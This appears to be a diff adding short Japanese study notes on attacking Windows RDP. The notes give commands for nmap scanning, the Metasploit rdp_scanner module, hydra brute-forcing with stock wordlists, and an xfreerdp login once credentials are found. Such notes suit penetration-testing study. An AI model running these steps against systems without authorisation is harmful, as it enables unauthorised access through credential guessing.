@@ -1,0 +1,14 @@
+windows：安全でないRDP
+1) pingを使って、ターゲットが稼働しているかを確認する
+2) nmapによって、セキュリティホールを探索する
+*RDPは、3389がデフォルトだが、3333にも設定可能
+3) msfconsoleを起動する
+service postgresql start && msfconsole
+use auxiliary/scanner/rdp/rdp_scanner
+set RHOSTS
+set RPORT
+exploit
+4) hydraを使って、ブルートフォース攻撃を行う
+hydra -L /usr/share/metasploit-frmaework/data/wordlists/common_users.txt -P /usr/share/metasploit-framework/data/wordlists/unix_passwords.txt rdp://ターゲットドメイン -s ポート番号
+5) 4)でクレデンシャルを見つけたら、それを使って、xfreerdpでリモートサーバーにアクセスする
+xfreerdp /u: /p: /v:ターゲットドメイン:ポート番号
